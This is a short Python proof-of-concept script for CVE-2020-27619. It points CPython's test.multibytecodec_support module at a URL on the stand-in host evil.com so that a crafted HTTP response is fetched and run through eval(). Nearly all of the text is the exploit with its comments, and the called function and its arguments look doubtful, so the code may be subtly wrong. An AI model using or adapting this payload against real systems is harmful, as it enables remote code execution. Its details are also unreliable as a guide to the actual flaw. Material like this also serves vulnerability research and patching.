# Import the multibytecodec_support module
import test.multibytecodec_support as mbc_support

# Define a URL that points to a malicious server
# The server will send a crafted HTTP response
# The response will contain malicious code that will be executed by eval()
url = "http://evil.com/cve-2020-27619"

# Call the test_decode_refex function with the URL
# This will trigger the vulnerability in the multibytecodec_support.py module
# The eval() function will execute the malicious code from the HTTP response
mbc_support.test_decode_refex("euc_kr", url)